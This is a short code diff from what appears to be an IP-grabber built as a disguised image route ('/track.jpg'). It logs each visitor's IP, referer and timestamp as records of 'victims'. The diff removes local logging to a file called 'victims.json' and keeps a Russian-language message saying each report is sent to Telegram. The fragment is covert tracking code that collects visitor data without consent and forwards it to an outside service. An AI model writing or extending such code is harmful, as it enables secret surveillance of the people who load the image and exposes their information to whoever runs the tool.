@@ -135,7 +135,6 @@ app.get('/track.jpg', async (req, res) => {
         referer,
         timestamp: new Date().toISOString()
     };
-    fs.appendFileSync('victims.json', JSON.stringify(logEntry) + '\n');
     
     console.log(`[+] Отчет отправлен в Telegram | IP: ${ip} | Site: ${website}`);
     
